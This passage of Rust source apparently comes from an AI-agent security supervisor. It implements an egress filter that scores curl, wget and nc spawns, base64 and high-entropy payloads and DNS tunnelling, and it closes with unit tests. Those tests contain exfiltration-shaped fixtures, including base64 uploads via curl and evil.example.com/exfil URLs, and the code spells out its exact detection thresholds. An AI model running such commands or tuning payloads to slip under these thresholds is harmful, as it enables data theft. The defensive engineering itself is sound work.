                        exfil_shape = true;
                    }
                    if has_untrusted_dest {
                        best = Self::select_higher_risk(best, shape);
                    }
                }
            }
            ToolCallType::ProcessSpawn { command, args } => {
                let full = if args.is_empty() {
                    command.clone()
                } else {
                    format!("{} {}", command, args.join(" "))
                };
                // A#3: a Chromium-family browser forking its own `--type=<helper>`
                // subprocess (renderer/gpu/utility/zygote/crashpad) is an
                // IPC-connected internal fork, not a fetch — the outbound-command
                // token would otherwise flag every helper. The MAIN launch (a URL,
                // no `--type=`) is not a subprocess and is still scored below, and
                // any real egress by the network-service child is scored at
                // NetConnect/DnsQuery time.
                if !is_browser_subprocess_spawn(command, args) {
                    best = Self::select_higher_risk(
                        best,
                        self.evaluate_command_tokens(&full, prof_trusted),
                    );
                }

                let arg_text = args.join(" ");
                if !arg_text.is_empty() {
                    let is_trusted =
                        |host: &str| self.is_trusted_or_allowed_local(host, prof_trusted);
                    let mut has_dest = false;
                    let mut has_untrusted_dest = false;
                    for dest in self.extract_destinations_from_command(&arg_text) {
                        has_dest = true;
                        if !is_trusted(&dest.host) {
                            has_untrusted_dest = true;
                        }
                        best = Self::select_higher_risk(
                            best,
                            self.evaluate_destination(&dest, "command", prof_trusted),
                        );
                        best = Self::select_higher_risk(
                            best,
                            self.evaluate_unusual_port(&dest, "command"),
                        );
                    }
                    // Scheme-LESS URL forms (`curl example.com/up?d=<blob>`,
                    // `wget host/p`) never match the `scheme://` URL regex, so
                    // the loop above misses them. The bare-destination scanner
                    // — already trusted for review suppression — recognises an
                    // untrusted scheme-less host with the same flag /
                    // consumed-value / local-path / private-IP guards, so it
                    // also opens the exfil-shape gate. Passed `full` (binary
                    // included) because the scanner skips token[0] as the
                    // program name.
                    if !has_untrusted_dest
                        && self.command_has_untrusted_bare_destination(&full, &is_trusted)
                    {
                        has_untrusted_dest = true;
                    }
                    if has_untrusted_dest {
                        has_dest = true;
                    }
                    // Exfil-shape scoring for any spawned tool handed a URL —
                    // curl, wget, http(ie), aria2c, a headless-browser cmdline,
                    // a bespoke uploader. A base64 blob / high-entropy segment /
                    // over-long argument in the argv is *scored* only when the
                    // spawn targets an UNTRUSTED destination, so it catches
                    // `curl https://evil/x?d=<blob>` and `curl -d <blob> https://evil`
                    // without queueing signed requests to trusted hosts. The
                    // exfil_shape *flag* is set whenever a shape rides a real
                    // destination (trusted or not) so C2 can escalate a shaped
                    // payload to a trusted host under reputation/taint; URL-less
                    // spawns (`git checkout <sha>`, `docker run img@sha256:<hex>`)
                    // carry no destination, so they set neither.
                    let shape = self.evaluate_protocol_signals(&arg_text, "command_args");
                    if has_dest && shape.is_some() {
                        exfil_shape = true;
                    }
                    if has_untrusted_dest {
                        best = Self::select_higher_risk(best, shape);
                    }
                }
            }
            _ => {}
        }

        let mut result = best.unwrap_or_else(|| FilterResult::no_match("egress-policy"));
        if exfil_shape {
            // Visible to the precision meta-rule (C2) and to forensics even when
            // the winning signal is unknown-destination / command-token.
            result
                .metadata
                .insert("exfil_shape".to_string(), serde_json::Value::Bool(true));
        }
        Ok(result)
    }
}

/// Extract the basename of a shell token for outbound-binary matching.
///
/// - `/usr/bin/curl` → `curl`
/// - `./bin/nc` → `nc`
/// - `curl` → `curl`
/// - `curl?` (any non-path suffix) → returned as-is; equality check handles it.
///
/// Strips a trailing semicolon or comma (shell list separators), but does not
/// attempt shell-quote unescaping — callers feed pre-tokenised argv.
fn token_basename(token: &str) -> &str {
    let trimmed = token.trim_end_matches([';', ',', '|', '&']);
    match trimmed.rsplit_once('/') {
        Some((_, basename)) if !basename.is_empty() => basename,
        _ => trimmed,
    }
}

/// Chromium-family browser binary basenames (A#3). A `--type=` arg on one of
/// these marks an internal helper-process fork rather than a URL fetch.
const BROWSER_BINARIES: &[&str] = &[
    "chrome",
    "chrome.exe",
    "google-chrome",
    "google-chrome-stable",
    "google-chrome-beta",
    "google-chrome-unstable",
    "chromium",
    "chromium-browser",
    "msedge",
    "msedge.exe",
    "microsoft-edge",
    "microsoft-edge-stable",
    "brave",
    "brave-browser",
    "opera",
    "vivaldi",
    "vivaldi-stable",
];

/// A#3: true when this spawn is a Chromium-family browser forking one of its own
/// internal helper processes (`--type=renderer|gpu-process|utility|zygote|
/// crashpad-handler|…`) or the standalone crashpad-handler binary. These are
/// IPC-connected child processes, not network egress; the actual egress of the
/// network-service child is scored at NetConnect/DnsQuery time. The MAIN launch
/// (a URL, no `--type=`) is NOT a subprocess and is still scored.
fn is_browser_subprocess_spawn(command: &str, args: &[String]) -> bool {
    let base = token_basename(command).to_ascii_lowercase();
    if base.contains("crashpad_handler") {
        return true;
    }
    BROWSER_BINARIES.contains(&base.as_str()) && args.iter().any(|a| a.starts_with("--type="))
}

fn normalize_vec(values: Vec<String>) -> Vec<String> {
    values
        .into_iter()
        .map(|v| v.trim().to_lowercase())
        .filter(|v| !v.is_empty())
        .collect()
}

fn normalize_tokens(values: Vec<String>) -> HashSet<String> {
    normalize_vec(values).into_iter().collect()
}

/// True for URI schemes that reference a cloud object-storage bucket/object
/// rather than a resolvable network host. Used to skip them during
/// command-string destination extraction — see
/// [`EgressPolicyFilter::extract_destinations_from_command`].
fn is_object_storage_uri_scheme(scheme: &str) -> bool {
    matches!(
        scheme,
        "s3" | "s3a"
            | "s3n"
            | "gs"
            | "gcs"
            | "wasb"
            | "wasbs"
            | "abfs"
            | "abfss"
            | "adl"
            | "adls"
            | "b2"
            | "r2"
            | "oss"
            | "cos"
            | "swift"
            | "minio"
    )
}

fn normalize_domains(values: Vec<String>) -> HashSet<String> {
    normalize_vec(values)
        .into_iter()
        .map(|v| v.trim_start_matches('.').to_string())
        .collect()
}

fn parse_host_port(authority: &str) -> (String, Option<u16>) {
    if authority.starts_with('[') {
        if let Some(end) = authority.find(']') {
            let host = authority[1..end].to_string();
            let remainder = authority.get(end + 1..).unwrap_or_default();
            if let Some(port_text) = remainder.strip_prefix(':') {
                if let Ok(port) = port_text.parse::<u16>() {
                    return (host, Some(port));
                }
            }
            return (host, None);
        }
        return (authority.to_string(), None);
    }

    if let Some((host, port_text)) = authority.rsplit_once(':') {
        if !host.contains(':') && !port_text.is_empty() {
            if let Ok(port) = port_text.parse::<u16>() {
                return (host.to_string(), Some(port));
            }
        }
    }

    (authority.to_string(), None)
}

// ── DNS-tunnelling shape detection (W4) ──────────────────────────────────────
//
// DNS exfiltration/tunnelling smuggles data in the subdomain labels of a query
// (`<base32-chunk>.<chunk>.tunnel.example.com`) or uses data-bearing query types
// (TXT/NULL) to carry a payload back. Legitimate hostnames are short and
// low-entropy; encoded payloads are long and high-entropy. These thresholds are
// deliberately independent of the URL-oriented base64/entropy config — they
// describe DNS labels, not URLs — and are tuned to lean toward precision (a
// false trigger on an allowlisted parent only QUEUEs a lookup, it never denies).

/// A single subdomain label at or above this length is unusual for a real
/// hostname and characteristic of an encoded chunk.
const DNS_TUNNEL_LABEL_MIN_LEN: usize = 32;
/// Minimum total length of the subdomain (non-registrable) region for the
/// multi-label "chunked encoding" trigger.
const DNS_TUNNEL_SUBDOMAIN_MIN_LEN: usize = 50;
/// Minimum subdomain length for the *data-bearing query type* trigger, which is
/// more sensitive because TXT/NULL queries are the classic tunnelling channel.
const DNS_TUNNEL_QTYPE_SUBDOMAIN_MIN_LEN: usize = 24;
/// Shannon-entropy floor (bits/char) for a region to read as encoded rather
/// than a normal (dictionary-ish, low-entropy) hostname. Real tunnels use
/// base32/base64 (entropy ~4.5–6.0); dictionary subdomains and long service
/// names sit ~3.5–3.9, so 4.0 separates them cleanly. Hex-encoded tunnels
/// (~4.0, and space-inefficient over DNS) sit right at the boundary — an
/// accepted precision/recall trade documented here.
const DNS_TUNNEL_ENTROPY_THRESHOLD: f64 = 4.0;

/// A detected DNS-tunnelling shape. `high_risk_qtype` is set when the query type
/// can carry arbitrary data back to the resolver (TXT/NULL/CNAME/ANY) — the
/// caller weights the score up for those.
#[derive(Debug, Clone)]
pub struct DnsTunnelingSignal {
    pub reason: String,
    pub high_risk_qtype: bool,
}

/// DNS query types that can smuggle a data payload back to the client — the
/// classic tunnelling channels.
fn is_high_risk_dns_qtype(query_type: &str) -> bool {
    matches!(
        query_type.trim().to_ascii_uppercase().as_str(),
        "TXT" | "NULL" | "CNAME" | "ANY"
    )
}

/// Detect a DNS-tunnelling shape in a query name. Returns `Some` when the
/// subdomain labels look like an encoded payload (long + high-entropy), or when
/// a data-bearing query type carries a moderately long high-entropy subdomain.
///
/// Public so the supervisor's DNS decision path can consult it: a query below an
/// *allowlisted* parent zone must still be tunnelling-checked before it is
/// blind-allowed (closing the "tunnel under a trusted parent" hole).
pub fn dns_tunneling_signal(domain: &str, query_type: &str) -> Option<DnsTunnelingSignal> {
    let domain = domain.trim().trim_end_matches('.').to_ascii_lowercase();
    if domain.is_empty() {
        return None;
    }
    let labels: Vec<&str> = domain.split('.').filter(|l| !l.is_empty()).collect();
    if labels.is_empty() {
        return None;
    }
    let high_risk_qtype = is_high_risk_dns_qtype(query_type);

    // (a) Any single long high-entropy label — a full 63-char-ish encoded chunk.
    for label in &labels {
        if label.len() >= DNS_TUNNEL_LABEL_MIN_LEN
            && shannon_entropy(label) >= DNS_TUNNEL_ENTROPY_THRESHOLD
        {
            return Some(DnsTunnelingSignal {
                reason: format!(
                    "long high-entropy label ({} chars, entropy {:.2})",
                    label.len(),
                    shannon_entropy(label)
                ),
                high_risk_qtype,
            });
        }
    }

    // The "subdomain" (non-registrable) region: everything except the last two
    // labels (a coarse public-suffix approximation — good enough since real
    // sub.example.com regions are short/low-entropy). Concatenated without dots
    // so chunked encodings (`aa.bb.cc.…`) are measured as one payload.
    let sub_end = labels.len().saturating_sub(2);
    let subdomain: String = labels[..sub_end].concat();
    if !subdomain.is_empty() {
        let entropy = shannon_entropy(&subdomain);
        // (b) Long, high-entropy multi-label subdomain — chunked encoding.
        if subdomain.len() >= DNS_TUNNEL_SUBDOMAIN_MIN_LEN
            && entropy >= DNS_TUNNEL_ENTROPY_THRESHOLD
        {
            return Some(DnsTunnelingSignal {
                reason: format!(
                    "high-entropy multi-label subdomain ({} chars, entropy {entropy:.2})",
                    subdomain.len()
                ),
                high_risk_qtype,
            });
        }
        // (c) Data-bearing query type with a shorter encoded subdomain — TXT/NULL
        // tunnels can afford smaller labels because the answer carries the load.
        if high_risk_qtype
            && subdomain.len() >= DNS_TUNNEL_QTYPE_SUBDOMAIN_MIN_LEN
            && entropy >= DNS_TUNNEL_ENTROPY_THRESHOLD
        {
            return Some(DnsTunnelingSignal {
                reason: format!(
                    "{} query with encoded subdomain ({} chars, entropy {entropy:.2})",
                    query_type.trim().to_ascii_uppercase(),
                    subdomain.len()
                ),
                high_risk_qtype,
            });
        }
    }

    None
}

/// Shannon entropy in bits per character.
fn shannon_entropy(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts = [0u32; 256];
    let len = s.len() as f64;
    for &b in s.as_bytes() {
        counts[b as usize] += 1;
    }
    counts
        .iter()
        .copied()
        .filter(|&c| c > 0)
        .map(|c| {
            let p = c as f64 / len;
            -p * p.log2()
        })
        .sum()
}

/// Returns the length of the longest contiguous run of base64-alphabet characters
/// (A-Z, a-z, 0-9, +, /, =). Returns `None` if no run is found.
fn longest_base64_run(s: &str) -> Option<usize> {
    let mut max_run = 0usize;
    let mut current_run = 0usize;
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=' {
            current_run += 1;
            if current_run > max_run {
                max_run = current_run;
            }
        } else {
            current_run = 0;
        }
    }
    if max_run > 0 {
        Some(max_run)
    } else {
        None
    }
}

/// Returns `true` if the bind address is a loopback address that OpenClaw allows
/// without review (127.0.0.1, ::1, or "localhost").
///
/// PR 5 Phase A: parse the address as an `IpAddr` and use `is_loopback()`
/// instead of the previous literal-string equality. Additional handling for
/// IPv4-mapped IPv6 addresses (`::ffff:a.b.c.d`) so that
/// `::ffff:127.0.0.1` (which the kernel binds to the v4 loopback)
/// correctly classifies as loopback while `::ffff:0.0.0.0` does not.
fn is_loopback_bind_address(addr: &str) -> bool {
    if addr.eq_ignore_ascii_case("localhost") {
        return true;
    }
    let Ok(ip) = addr.parse::<std::net::IpAddr>() else {
        return false;
    };
    if ip.is_loopback() {
        return true;
    }
    // IPv4-mapped IPv6 — unwrap and check the inner v4 address.
    if let std::net::IpAddr::V6(v6) = ip {
        if let Some(v4) = v6.to_ipv4_mapped() {
            return v4.is_loopback();
        }
    }
    false
}

/// PR 5 Phase C: returns `true` if the bind address is a wildcard
/// (`0.0.0.0`, `::`, or IPv4-mapped wildcard `::ffff:0.0.0.0`).
fn is_wildcard_bind_address(addr: &str) -> bool {
    let Ok(ip) = addr.parse::<std::net::IpAddr>() else {
        return false;
    };
    if ip.is_unspecified() {
        return true;
    }
    if let std::net::IpAddr::V6(v6) = ip {
        if let Some(v4) = v6.to_ipv4_mapped() {
            return v4.is_unspecified();
        }
    }
    false
}

/// curl/wget flags that consume the FOLLOWING token as a value, so that value
/// (often a filename or header that can look host-like, e.g. `-o output.json`)
/// is not mistaken for a network destination in the FP §5.4 bare-host scan.
/// Best-effort across curl + wget; an unrecognised flag's value is, if it looks
/// like an untrusted host, treated conservatively (blocks suppression).
const VALUE_TAKING_FETCH_FLAGS: &[&str] = &[
    "-o",
    "--output",
    "-O",
    "--output-document",
    "-T",
    "--upload-file",
    "-d",
    "--data",
    "--data-binary",
    "--data-raw",
    "--data-urlencode",
    "-F",
    "--form",
    "-H",
    "--header",
    "-A",
    "--user-agent",
    "-e",
    "--referer",
    "-b",
    "--cookie",
    "-c",
    "--cookie-jar",
    "-u",
    "--user",
    "-x",
    "--proxy",
    "-K",
    "--config",
    "--cacert",
    "--cert",
    "--key",
    "--capath",
    "-w",
    "--write-out",
    "-U",
    "--post-file",
    "--post-data",
    "-P",
    "--directory-prefix",
    "-a",
    "--append-output",
    "--ciphers",
    "--connect-timeout",
    "--retry",
];

/// FP §5.4 bare-host scan helper: does `s` look like a DNS hostname with a TLD
/// (`evil.example.com`)? Requires ≥2 dot-separated labels of `[a-z0-9-]`, a
/// non-empty alphabetic last label (TLD) of length ≥2. Excludes IPs (handled
/// separately) and plain identifiers without a dotted TLD shape. `s` may be any
/// case. Note `output.json` matches this shape, which is why the caller skips
/// flag-consumed values before reaching here.
fn looks_like_hostname(s: &str) -> bool {
    if s.is_empty() || s.len() > 253 {
        return false;
    }
    let mut count = 0usize;
    let mut last = "";
    for label in s.split('.') {
        if label.is_empty() {
            return false;
        }
        if !label
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'-')
        {
            return false;
        }
        count += 1;
        last = label;
    }
    count >= 2 && last.len() >= 2 && last.bytes().all(|b| b.is_ascii_alphabetic())
}

fn is_private_or_local_host(host: &str) -> bool {
    if host.eq_ignore_ascii_case("localhost") {
        return true;
    }

    match host.parse::<IpAddr>() {
        Ok(IpAddr::V4(ip)) => {
            ip.is_private()
                || ip.is_loopback()
                || ip.is_link_local()
                || ip.is_broadcast()
                || ip.is_documentation()
        }
        Ok(IpAddr::V6(ip)) => {
            let first_segment = ip.segments()[0];
            let is_unique_local = (first_segment & 0xfe00) == 0xfc00; // fc00::/7
            let is_link_local = (first_segment & 0xffc0) == 0xfe80; // fe80::/10
            ip.is_loopback() || ip.is_unspecified() || is_unique_local || is_link_local
        }
        Err(_) => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use uuid::Uuid;

    fn make_ctx(call_type: ToolCallType) -> ToolCallContext {
        ToolCallContext::new("test", call_type, Uuid::new_v4())
    }

    /// Helper: create a filter with some trusted domains for tests that need them.
    fn filter_with_trusted() -> EgressPolicyFilter {
        let mut cfg = EgressPolicyConfig::default();
        cfg.trusted_domains = vec![
            "github.com".into(),
            "api.github.com".into(),
            "registry.npmjs.org".into(),
            "pypi.org".into(),
            "crates.io".into(),
        ];
        EgressPolicyFilter::from_config(cfg)
    }

    /// Regression: rustc invocations contain `incremental` (substring `nc`),
    /// `digest` (substring `dig`), etc. Pre-fix, the substring matcher would
    /// fire `review-egress-command-token: nc`. Post-fix (basename equality),
    /// rustc spawns must NOT trip an outbound-command-token rule.
    #[tokio::test]
    async fn rustc_spawn_does_not_trigger_command_token() {
        let filter = EgressPolicyFilter::with_defaults();
        let args: Vec<String> = [
            "--crate-name",
            "grith_supervisor",
            "-C",
            "incremental=/tmp/target/incremental",
            "--extern",
            "grith_digest=/tmp/target/libgrith_digest.rmeta",
            "-C",
            "linker=clang",
        ]
        .iter()
        .map(|s| (*s).to_string())
        .collect();
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/home/x/.rustup/toolchains/stable/bin/rustc".into(),
            args,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(
            !result.matched
                || (result.rule_id != "review-egress-command-token"
                    && result.rule_id != "blocked-egress-command-token"),
            "rustc spawn must not trigger command-token rule, got rule_id={} message={}",
            result.rule_id,
            result.message
        );
    }

    /// Positive case: an actual `nc` spawn (the netcat binary) must still
    /// trigger the review rule.
    #[tokio::test]
    async fn nc_spawn_triggers_review_command_token() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/usr/bin/nc".into(),
            args: vec!["google.com".into(), "80".into()],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "review-egress-command-token");
        assert!(result.message.contains("nc"));
    }

    /// Positive case: bare `curl` command (no absolute path) still matches.
    #[tokio::test]
    async fn bare_curl_spawn_triggers_review_command_token() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "curl".into(),
            args: vec!["https://example.com/data".into()],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // curl is `review`; the URL also triggers `unknown-destination`
        // (4.5 in enforce) which outranks `review` (3.5). Either is fine —
        // the assertion is that *something* matched on the curl spawn.
    }

    /// Negative case: a binary whose basename contains a token as a substring
    /// (e.g. `mync`, `digger`) must NOT trigger the rule.
    #[tokio::test]
    async fn substring_basename_does_not_trigger() {
        let filter = EgressPolicyFilter::with_defaults();
        for cmd in ["/usr/local/bin/mync", "/usr/bin/digger", "/opt/wgetlike"] {
            let ctx = make_ctx(ToolCallType::ProcessSpawn {
                command: cmd.into(),
                args: vec![],
            });
            let result = filter.evaluate(&ctx).await.unwrap();
            assert!(
                !result.matched
                    || (result.rule_id != "review-egress-command-token"
                        && result.rule_id != "blocked-egress-command-token"),
                "{cmd} must not trip command-token rule, got rule_id={} message={}",
                result.rule_id,
                result.message
            );
        }
    }

    #[tokio::test]
    async fn test_blocked_scheme_is_high_risk() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "ftp://example.com/file.txt".into(),
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "blocked-scheme");
        assert!(result.score >= 6.0);
    }

    #[tokio::test]
    async fn test_trusted_domain_reduces_score() {
        let filter = filter_with_trusted();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://github.com/grith-ai/grith".into(),
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn test_unknown_domain_reviews_by_default() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://unseen-domain-for-test.example/path".into(),
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "unknown-destination");
        assert!(result.score > 0.0);
    }

    #[tokio::test]
    async fn test_unknown_dns_query_is_soft_signal_not_review() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::DnsQuery {
            domain: "attacker-controlled-for-test.example".into(),
            query_type: "A".into(),
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        // An unknown DNS destination is tagged and contributes a sub-threshold
        // signal (FP §5.9) — it must NOT carry the full review score, so routine
        // resolution never queues on the egress signal alone.
        assert!(result.matched);
        assert_eq!(result.rule_id, "unknown-destination");
        assert_eq!(result.score, UNKNOWN_DNS_SOFT_SCORE);
        assert!(result.score < filter.review_score());
    }

    #[tokio::test]
    async fn test_unknown_non_dns_destination_keeps_full_review() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "attacker-controlled-for-test.example".into(),
            port: 443,
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        // The softening is DNS-only; an actual connection to an unknown host
        // still draws the full review score.
        assert!(result.matched);
        assert_eq!(result.rule_id, "unknown-destination");
        assert_eq!(result.score, filter.review_score());
    }

    #[tokio::test]
    async fn ambiguous_candidates_all_trusted_score_trusted() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.trusted_domains = vec!["oaiusercontent.com".into()];
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: r#"["sdmntprsouthcentralus.oaiusercontent.com","sdmntprwestus3.oaiusercontent.com"]"#.into(),
            port: 443,
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn ambiguous_candidates_mixed_trusted_unknown_keeps_review() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.trusted_domains = vec!["oaiusercontent.com".into()];
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: r#"["cdn.oaiusercontent.com","cotenant-for-test.example"]"#.into(),
            port: 443,
        });

        // One untrusted co-tenant on the shared IP must forfeit the trusted
        // credit: the connection could reach either tenant.
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "unknown-destination");
        assert_eq!(result.score, filter.review_score());
        assert!(result.message.contains("cotenant-for-test.example"));
        assert!(result.message.contains("ambiguous shared-IP"));
    }

    #[tokio::test]
    async fn ambiguous_candidates_blocked_cotenant_escalates() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.trusted_domains = vec!["oaiusercontent.com".into()];
        cfg.blocked_domains = vec!["evil-for-test.example".into()];
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: r#"["cdn.oaiusercontent.com","exfil.evil-for-test.example"]"#.into(),
            port: 443,
        });

        // Before candidate explosion the array literal matched neither the
        // blocked nor the trusted list and under-scored as a generic unknown
        // destination; the blocked co-tenant must win the worst-case fold.
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "blocked-domain");
        assert_eq!(result.score, filter.blocked_score());
    }

    #[tokio::test]
    async fn ambiguous_candidates_profile_trusted_all_match() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("codex".into(), vec!["oaiusercontent.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx_with_profile(
            ToolCallType::NetConnect {
                address: r#"["a.oaiusercontent.com","b.oaiusercontent.com"]"#.into(),
                port: 443,
            },
            "codex",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "profile-trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn malformed_candidate_array_scores_as_unknown_host() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.trusted_domains = vec!["oaiusercontent.com".into()];
        let filter = EgressPolicyFilter::from_config(cfg);
        // Not valid JSON: degrades to opaque-host handling, which cannot
        // match a trusted domain and therefore keeps the review score.
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: r#"["cdn.oaiusercontent.com""#.into(),
            port: 443,
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "unknown-destination");
        assert_eq!(result.score, filter.review_score());
    }

    #[tokio::test]
    async fn test_netconnect_blocked_port() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "198.51.100.25".into(),
            port: 25,
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "blocked-port");
    }

    #[tokio::test]
    async fn test_command_token_review() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ShellExec {
            command: "curl".into(),
            args: vec!["https://example.org/upload".into()],
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "review-egress-command-token");
    }

    #[tokio::test]
    async fn test_object_storage_uri_not_flagged_as_destination() {
        // A cloud object-storage bucket URI in argv is not a network host — the
        // real egress is checked at connect time. `aws`/`s3` are not review
        // command tokens, so with s3:// extraction suppressed the command draws
        // no egress signal at all.
        let filter = EgressPolicyFilter::with_defaults();
        for full in [
            "aws s3 rm s3://staging-builds/old-artifact.zip",
            "gsutil ls gs://my-bucket/data",
            "aws s3 cp report.csv s3://prod-data/out/report.csv",
        ] {
            let parts: Vec<&str> = full.split_whitespace().collect();
            let ctx = make_ctx(ToolCallType::ShellExec {
                command: parts[0].into(),
                args: parts[1..].iter().map(|s| s.to_string()).collect(),
            });
            let result = filter.evaluate(&ctx).await.unwrap();
            assert!(
                !result.matched,
                "object-storage URI must not draw an egress signal: {full:?} -> {} ({})",
                result.score, result.rule_id
            );
        }
    }

    #[tokio::test]
    async fn test_http_url_in_command_still_extracted() {
        // Guard: suppressing object-storage schemes must NOT disable http(s)
        // destination extraction from command strings.
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ShellExec {
            command: "git".into(),
            args: vec![
                "remote".into(),
                "add".into(),
                "origin".into(),
                "https://unseen-domain-for-test.example/r.git".into(),
            ],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "unknown-destination");
    }

    #[tokio::test]
    async fn test_unusual_port_flagged() {
        // Disable review_unknown_destinations so unusual-port isn't masked
        let cfg = EgressPolicyConfig {
            review_unknown_destinations: false,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "198.51.100.25".into(),
            port: 4444,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "unusual-port");
    }

    #[tokio::test]
    async fn test_af_packet_net_connect_scores_high() {
        // AF_PACKET sendto() reaches the egress filter as NetConnect with
        // address="raw:af_packet". It must score >= 7.0 regardless of mode.
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "raw:af_packet".into(),
            port: 0,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched, "raw:af_packet must produce a match");
        assert_eq!(result.rule_id, "raw-socket");
        assert!(
            result.score >= 7.0,
            "raw:af_packet score must be >= 7.0 to reach deny range, got {}",
            result.score
        );
    }

    #[tokio::test]
    async fn test_raw_socket_score_is_mode_independent() {
        // Even in Monitor mode the raw-socket score must remain 7.0 — raw
        // sockets are always dangerous regardless of egress policy mode.
        let cfg = EgressPolicyConfig {
            mode: EgressMode::Monitor,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "raw:af_packet".into(),
            port: 0,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(result.rule_id, "raw-socket");
        assert_eq!(result.score, 7.0);
    }

    #[tokio::test]
    async fn test_high_entropy_url_flagged() {
        let cfg = EgressPolicyConfig {
            entropy_threshold: 3.8,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://evil.example.com/exfil?d=a8f3e1b2c4d5f6071829304a5b6c7d8e9f0a1b2c3d4e5f607182930".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // Could be high-entropy-segment or unknown-destination — both are valid signals
        assert!(
            result.rule_id == "high-entropy-segment" || result.rule_id == "unknown-destination",
            "unexpected rule_id: {}",
            result.rule_id
        );
    }

    #[tokio::test]
    async fn test_base64_chunk_in_command_flagged() {
        let cfg = EgressPolicyConfig {
            base64_min_chunk_len: 30,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let b64_payload = "SGVsbG9Xb3JsZFRoaXNJc0FCYXNlNjRQYXlsb2FkVGhhdElzUXVpdGVMb25n";
        let ctx = make_ctx(ToolCallType::ShellExec {
            command: "curl".into(),
            args: vec![
                "-d".into(),
                b64_payload.into(),
                "https://example.com/upload".into(),
            ],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // The review-egress-command-token or base64-chunking could win depending on score
        assert!(result.score > 0.0);
    }

    #[tokio::test]
    async fn test_suspicious_url_length_flagged() {
        let cfg = EgressPolicyConfig {
            suspicious_url_length: 100,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let long_path = "a".repeat(120);
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: format!("https://evil.example.com/{long_path}"),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert!(result.score > 0.0);
    }

    #[tokio::test]
